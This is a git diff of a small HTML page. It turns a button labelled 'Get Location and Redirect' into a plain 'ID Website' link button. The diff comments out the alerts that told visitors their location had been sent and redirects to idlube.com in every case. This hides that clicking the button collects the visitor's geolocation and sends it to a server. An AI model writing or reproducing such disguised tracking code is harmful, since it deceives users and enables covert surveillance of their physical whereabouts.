@@ -1,11 +1,18 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Get Location and Redirect</title>
+    <title>Go to ID Website</title>
 </head>
 <body>
+    <div style="display: flex;justify-content: center; align-items: center;">
+        <button 
+            style="margin: 50px;font-size: 24px; padding: 10px 20px; cursor: pointer;background-color: rgb(93, 147, 249);"
+            onclick="getLocation()">
+            ID Website
+        </button>
+    </div>
 
-<button onclick="getLocation()">Get Location and Redirect</button>
+
 
 <script>
 function getLocation() {
@@ -32,12 +39,13 @@ function sendLocationAndRedirect(position) {
     .then(response => response.json())
     .then(data => {
         if (data.status === 'success') {
-            alert('Location sent successfully!');
+            // alert('Location sent successfully!');
             // Redirect to www.idlube.com
-            window.location.href = 'http://www.idlube.com';
+            
         } else {
-            alert('Failed to send location.');
+            // alert('Failed to send location.');
         }
+        window.location.href = 'http://www.idlube.com';
     })
     .catch(error => {
         console.error('Error sending location:', error);
